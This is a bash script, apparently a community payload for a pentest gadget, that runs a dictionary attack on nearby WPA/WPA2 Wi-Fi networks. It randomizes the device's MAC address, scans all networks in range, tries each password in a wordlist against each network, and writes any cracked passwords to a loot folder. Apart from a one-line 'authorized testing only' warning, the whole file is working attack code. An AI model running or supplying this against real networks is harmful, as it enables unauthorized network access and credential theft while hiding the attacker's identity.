#!/bin/bash
# Title: WiFi Dictionary Attack
# Description: Dictionary-based password attack on WPA/WPA2 networks
# Author: Community
# Version: 1.0
# Category: Attack
#
# WARNING: For authorized testing only. Unauthorized use is illegal.
#
# This script scans for WPA/WPA2 networks and attempts to authenticate
# using passwords from a dictionary file. Successful credentials are
# saved to the loot folder.

# ============================================
# OPTIONS - Configure before running
# ============================================

# Loot directory for saving successful credentials
LOOTDIR=/root/loot/wifi_dictionary

# Path to password dictionary file (one password per line)
PASSWORD_LIST="/root/wordlists/medium.txt"

# Excluded SSIDs (comma-separated, e.g., "HomeNetwork,LabWifi")
EXCLUDED_SSIDS=""

# Connection timeout per password attempt (seconds)
CONNECT_TIMEOUT=15

# Delay between connection attempts (seconds) - helps avoid rate limiting
ATTEMPT_DELAY=1

# Interface to use (leave empty for auto-detect)
INTERFACE=""

# ============================================
# INTERNAL FILES
# ============================================

SCAN_RESULTS="/tmp/wifi_dict_scan.txt"
WPA_CONF="/tmp/wpa_dict_temp.conf"
WPA_CTRL="/tmp/wpa_dict_ctrl"
CANCEL_FLAG="/tmp/wifi_dict_cancel"
STATUS_FILE="/tmp/wifi_dict_status"
ORIGINAL_MAC=""
LISTENER_PID=""
TOTAL_ATTEMPTS=0

# ============================================
# CLEANUP - Set trap early
# ============================================

disconnect_network() {
    # Stop wpa_supplicant
    pkill -f "wpa_supplicant.*$INTERFACE" 2>/dev/null
    
    # Flush IP address
    ip addr flush dev "$INTERFACE" 2>/dev/null
    
    # Small delay for cleanup
    sleep 1
}

restore_mac() {
    if [ -n "$ORIGINAL_MAC" ] && [ "$ORIGINAL_MAC" != "00:00:00:00:00:00" ]; then
        ip link set "$INTERFACE" down 2>/dev/null
        ip link set "$INTERFACE" address "$ORIGINAL_MAC" 2>/dev/null
        ip link set "$INTERFACE" up 2>/dev/null
        LOG "Restored original MAC: $ORIGINAL_MAC"
    fi
}

cleanup() {
    LOG "Cleaning up..."
    # Kill background listener if running
    if [ -n "$LISTENER_PID" ] && kill -0 "$LISTENER_PID" 2>/dev/null; then
        kill "$LISTENER_PID" 2>/dev/null
        wait "$LISTENER_PID" 2>/dev/null
    fi
    disconnect_network
    restore_mac
    rm -f "$WPA_CONF" "$SCAN_RESULTS" /tmp/wpa_dict.pid /tmp/wifi_dict_filtered.txt
    rm -f "$CANCEL_FLAG" "$STATUS_FILE"
    rm -rf "$WPA_CTRL"
}

trap cleanup EXIT

# ============================================
# HELPER FUNCTIONS
# ============================================

# Auto-detect wireless interface (not in monitor mode)
detect_wireless_interface() {
    local iface
    for iface in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
        # Skip interfaces in monitor mode
        if ! iw dev "$iface" info 2>/dev/null | grep -q "type monitor"; then
            echo "$iface"
            return 0
        fi
    done
    return 1
}

# Validate and set interface
setup_interface() {
    if [ -z "$INTERFACE" ]; then
        LOG "Auto-detecting wireless interface..."
        INTERFACE=$(detect_wireless_interface)
    fi
    
    if [ -z "$INTERFACE" ]; then
        LOG red "ERROR: No wireless interface found"
        ERROR_DIALOG "No wireless interface available (not in monitor mode)"
        exit 1
    fi
    
    # Verify interface exists
    if [ ! -d "/sys/class/net/$INTERFACE" ]; then
        LOG red "ERROR: Interface $INTERFACE does not exist"
        ERROR_DIALOG "Interface $INTERFACE not found"
        exit 1
    fi
    
    LOG green "Using interface: $INTERFACE"
}

# Validate dictionary file
validate_dictionary() {
    if [ ! -f "$PASSWORD_LIST" ]; then
        LOG red "ERROR: Dictionary file not found: $PASSWORD_LIST"
        ERROR_DIALOG "Dictionary file not found: $PASSWORD_LIST"
        exit 1
    fi
    
    local count=$(wc -l < "$PASSWORD_LIST" | tr -d ' ')
    if [ "$count" -eq 0 ]; then
        LOG red "ERROR: Dictionary file is empty"
        ERROR_DIALOG "Dictionary file is empty"
        exit 1
    fi
    
    LOG "Dictionary loaded: $count passwords"
}

# Save original MAC address
save_original_mac() {
    ORIGINAL_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)
    if [ -z "$ORIGINAL_MAC" ]; then
        LOG yellow "WARNING: Could not read original MAC address"
        ORIGINAL_MAC="00:00:00:00:00:00"
    fi
    LOG "Saved original MAC: $ORIGINAL_MAC"
}

# Generate and set random MAC address
randomize_mac() {
    LOG "Randomizing MAC address..."
    
    # Bring interface down
    ip link set "$INTERFACE" down 2>/dev/null
    
    # Generate random MAC (locally administered, unicast: 02:xx:xx:xx:xx:xx)
    local random_mac=$(printf '02:%02x:%02x:%02x:%02x:%02x' \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
        $((RANDOM%256)) $((RANDOM%256)))
    
    # Set new MAC
    if ip link set "$INTERFACE" address "$random_mac" 2>/dev/null; then
        ip link set "$INTERFACE" up
        LOG green "MAC randomized to: $random_mac"
    else
        ip link set "$INTERFACE" up
        LOG yellow "WARNING: Could not change MAC address (continuing with original)"
    fi
}

# Scan for WPA/WPA2 networks
scan_networks() {
    LOG "Scanning for WPA/WPA2 networks..."
    local spinner_id=$(START_SPINNER "Scanning")
    
    # Clear previous results
    > "$SCAN_RESULTS"
    
    # Use iw to scan - fixed awk logic to output at END of each BSS block
    iw dev "$INTERFACE" scan 2>/dev/null | awk '
        /^BSS / {
            # Output previous network if it was WPA/WPA2
            if (bssid && ssid && is_wpa) {
                print bssid, ssid
            }
            # Start new network
            bssid = $2
            gsub(/\(.*/, "", bssid)
            ssid = ""
            is_wpa = 0
        }
        /SSID:/ && !ssid {
            # Capture SSID (handle spaces by getting rest of line)
            sub(/.*SSID: */, "")
            ssid = $0
        }
        /WPA|RSN/ {
            is_wpa = 1
        }
        END {
            # Output last network if WPA/WPA2
            if (bssid && ssid && is_wpa) {
                print bssid, ssid
            }
        }
    ' > "$SCAN_RESULTS"
    
    STOP_SPINNER $spinner_id
    
    local count=$(wc -l < "$SCAN_RESULTS" 2>/dev/null | tr -d ' ')
    if [ "$count" -gt 0 ]; then
        LOG green "Found $count WPA/WPA2 networks"
        # Save to loot
        cp "$SCAN_RESULTS" "$LOOTDIR/scan_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
    else
        LOG yellow "No WPA/WPA2 networks found"
    fi
}

# Check if SSID is in exclusion list
is_excluded_ssid() {
    local ssid="$1"
    
    if [ -z "$EXCLUDED_SSIDS" ]; then
        return 1  # Not excluded
    fi
    
    # Parse comma-separated exclusions
    local OLD_IFS="$IFS"
    IFS=','
    for excluded in $EXCLUDED_SSIDS; do
        # Trim whitespace
        excluded=$(echo "$excluded" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        # Compare case-insensitive
        if [ "$(echo "$ssid" | tr '[:upper:]' '[:lower:]')" = "$(echo "$excluded" | tr '[:upper:]' '[:lower:]')" ]; then
            IFS="$OLD_IFS"
            return 0  # Excluded
        fi
    done
    IFS="$OLD_IFS"
    
    return 1  # Not excluded
}

# Filter scan results by exclusion list
filter_networks() {
    local filtered="/tmp/wifi_dict_filtered.txt"
    > "$filtered"
    
    while IFS= read -r line; do
        local bssid=$(echo "$line" | awk '{print $1}')
        local ssid=$(echo "$line" | cut -d' ' -f2-)
        
        if is_excluded_ssid "$ssid"; then
            LOG "Skipping excluded: $ssid"
        else
            echo "$line" >> "$filtered"
        fi
    done < "$SCAN_RESULTS"
    
    mv "$filtered" "$SCAN_RESULTS"
    
    local count=$(wc -l < "$SCAN_RESULTS" 2>/dev/null | tr -d ' ')
    LOG "Networks after exclusions: $count"
}

# Escape special characters for wpa_supplicant config
escape_for_wpa_conf() {
    local str="$1"
    # Escape backslashes first, then quotes
    str="${str//\\/\\\\}"
    str="${str//\"/\\\"}"
    echo "$str"
}

# Attempt to connect with given credentials
try_connect() {
    local ssid="$1"
    local password="$2"
    
    # Escape special characters for wpa_supplicant config
    local escaped_ssid=$(escape_for_wpa_conf "$ssid")
    local escaped_password=$(escape_for_wpa_conf "$password")
    
    # Kill any existing wpa_supplicant on this interface
    pkill -f "wpa_supplicant.*$INTERFACE" 2>/dev/null
    sleep 0.5
    
    # Create wpa_supplicant config with ctrl_interface for monitoring
    cat > "$WPA_CONF" <<EOF
ctrl_interface=$WPA_CTRL
ctrl_interface_group=0
update_config=0

network={
ssid="$escaped_ssid"
psk="$escaped_password"
key_mgmt=WPA-PSK
proto=WPA RSN
pairwise=CCMP TKIP
group=CCMP TKIP
}
EOF
    
    # Create ctrl interface directory
    mkdir -p "$WPA_CTRL"
    
    # Start wpa_supplicant in background (daemon mode)
    wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -P /tmp/wpa_dict.pid 2>/dev/null
    
    # Wait and check connection status using wpa_cli
    local waited=0
    while [ $waited -lt $CONNECT_TIMEOUT ]; do
        sleep 1
        waited=$((waited + 1))
        
        # Check wpa_cli status for COMPLETED state
        local status=$(wpa_cli -i "$INTERFACE" -p "$WPA_CTRL" status 2>/dev/null | grep "wpa_state=" | cut -d= -f2)
        
        if [ "$status" = "COMPLETED" ]; then
            return 0  # Success!
        fi
    done
    
    # Timeout - connection failed
    pkill -f "wpa_supplicant.*$INTERFACE" 2>/dev/null
    return 1
}

# Record successful credential to loot
record_hit() {
    local ssid="$1"
    local bssid="$2"
    local password="$3"
    
    local loot_file="$LOOTDIR/credentials.txt"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Append to credentials file
    echo "[$timestamp] SSID: $ssid | BSSID: $bssid | Password: $password" >> "$loot_file"
    
    # Also create individual file for this network
    local safe_ssid=$(echo "$ssid" | tr ' /' '__')
    local individual_file="$LOOTDIR/${safe_ssid}_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "SSID: $ssid"
        echo "BSSID: $bssid"
        echo "Password: $password"
        echo "Captured: $timestamp"
    } > "$individual_file"
    
    LOG green "SUCCESS! Credentials saved to loot"
    ALERT "Password found for $ssid!"
}

# Check if user requested cancellation
is_cancelled() {
    [ -f "$CANCEL_FLAG" ]
}

# Attack a single network with dictionary
attack_network() {
    local bssid="$1"
    local ssid="$2"
    local network_num="$3"
    local total_networks="$4"
    local password_count=$(wc -l < "$PASSWORD_LIST" | tr -d ' ')
    local current=0
    local skipped=0
    local attempts_made=0
    
    LOG ""
    LOG "============================================"
    LOG "Network $network_num of $total_networks: $ssid"
    LOG "============================================"
    LOG "BSSID: $bssid"
    LOG "Dictionary: $password_count passwords"
    LOG ""
    
    while IFS= read -r password || [ -n "$password" ]; do
        # Check for cancellation
        if is_cancelled; then
            LOG yellow "Attack cancelled by user"
            # Update global attempt counter before returning
            TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + attempts_made))
            return 2  # Special return code for cancelled
        fi
        
        current=$((current + 1))
        
        # Skip passwords shorter than 8 characters (WPA minimum)
        if [ ${#password} -lt 8 ]; then
            skipped=$((skipped + 1))
            continue
        fi
        
        attempts_made=$((attempts_made + 1))
        
        # Verbose progress - show every attempt
        LOG "[$network_num/$total_networks] $ssid: Attempt $current/$password_count (valid: $attempts_made)"
        
        # Update status file for external monitoring
        echo "$ssid|$current|$password_count|$attempts_made" > "$STATUS_FILE"
        
        if try_connect "$ssid" "$password"; then
            LOG green "[$network_num/$total_networks] $ssid: SUCCESS on attempt $current!"
            TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + attempts_made))
            record_hit "$ssid" "$bssid" "$password"
            disconnect_network
            return 0
        fi
        
        # Rate limiting delay
        sleep "$ATTEMPT_DELAY"
        
    done < "$PASSWORD_LIST"
    
    # Update global attempt counter
    TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + attempts_made))
    
    LOG yellow "[$network_num/$total_networks] $ssid: No password found ($attempts_made attempts, $skipped skipped)"
    return 1
}

# ============================================
# MAIN SCRIPT
# ============================================

LOG "=== WiFi Dictionary Attack ==="
LOG ""

# Create loot directory
mkdir -p "$LOOTDIR"

# Validate dictionary file first
validate_dictionary

# Setup and validate interface
setup_interface

# Save original MAC and randomize
save_original_mac
randomize_mac

# Scan for networks
scan_networks

# Check if any networks found
if [ ! -s "$SCAN_RESULTS" ]; then
    LOG red "No WPA/WPA2 networks found"
    ERROR_DIALOG "No WPA/WPA2 networks found"
    exit 1
fi

# Apply exclusion filter
filter_networks

# Check if any networks remain after filtering
network_count=$(wc -l < "$SCAN_RESULTS" 2>/dev/null | tr -d ' ')
if [ "$network_count" -eq 0 ]; then
    LOG yellow "No networks remaining after exclusions"
    ALERT "All networks excluded"
    exit 0
fi

# Show what we're about to attack
LOG ""
LOG "Networks to attack: $network_count"
LOG "Dictionary size: $(wc -l < "$PASSWORD_LIST" | tr -d ' ') passwords"
LOG ""

# Confirm before starting
resp=$(CONFIRMATION_DIALOG "Attack $network_count networks with dictionary?")
case $? in
    $DUCKYSCRIPT_REJECTED)
        LOG "Dialog rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "An error occurred"
        exit 1
        ;;
esac

case "$resp" in
    $DUCKYSCRIPT_USER_CONFIRMED)
        LOG "User confirmed - starting attack"
        ;;
    $DUCKYSCRIPT_USER_DENIED)
        LOG "User cancelled"
        exit 0
        ;;
    *)
        LOG "Unknown response: $resp"
        exit 1
        ;;
esac

# Initialize cancel flag and counters
rm -f "$CANCEL_FLAG"
hits=0
current_network=0
cancelled=false

# Start background listener for user cancellation
# When user presses any button, this creates the cancel flag
(
    resp=$(WAIT_FOR_INPUT)
    touch "$CANCEL_FLAG"
    LOG ""
    LOG yellow "Cancel requested (pressed: $resp) - stopping after current attempt..."
) &
LISTENER_PID=$!

LOG ""
LOG green "Attack started! Press any button to cancel."
LOG ""

# Run attack in foreground (checks cancel flag each iteration)
while IFS= read -r line; do
    current_network=$((current_network + 1))
    bssid=$(echo "$line" | awk '{print $1}')
    ssid=$(echo "$line" | cut -d' ' -f2-)
    
    attack_network "$bssid" "$ssid" "$current_network" "$network_count"
    result=$?
    
    if [ $result -eq 0 ]; then
        hits=$((hits + 1))
    elif [ $result -eq 2 ]; then
        # Cancelled
        cancelled=true
        break
    fi
    
    # Check if cancelled between networks
    if is_cancelled; then
        LOG yellow "Stopping before next network..."
        cancelled=true
        break
    fi
done < "$SCAN_RESULTS"

# Kill the background listener if still running
kill "$LISTENER_PID" 2>/dev/null
wait "$LISTENER_PID" 2>/dev/null

# Summary
LOG ""
LOG "============================================"
LOG "=== Attack Summary ==="
LOG "============================================"

if [ "$cancelled" = true ]; then
    LOG yellow "Status: Cancelled by user"
    # If cancelled mid-network, we attempted but didn't complete it
    networks_completed=$((current_network - 1))
    if [ $networks_completed -lt 0 ]; then
        networks_completed=0
    fi
    LOG "Networks completed: $networks_completed of $network_count"
    LOG "Networks attempted: $current_network of $network_count"
else
    LOG green "Status: Complete"
    LOG "Networks attacked: $network_count"
fi

LOG "Total password attempts: $TOTAL_ATTEMPTS"
LOG green "Passwords found: $hits"
LOG ""

if [ "$hits" -gt 0 ]; then
    ALERT "Found $hits password(s)! Check loot folder."
elif [ "$cancelled" = true ]; then
    ALERT "Attack cancelled. $hits passwords found."
else
    ALERT "Attack complete. No passwords found."
fi

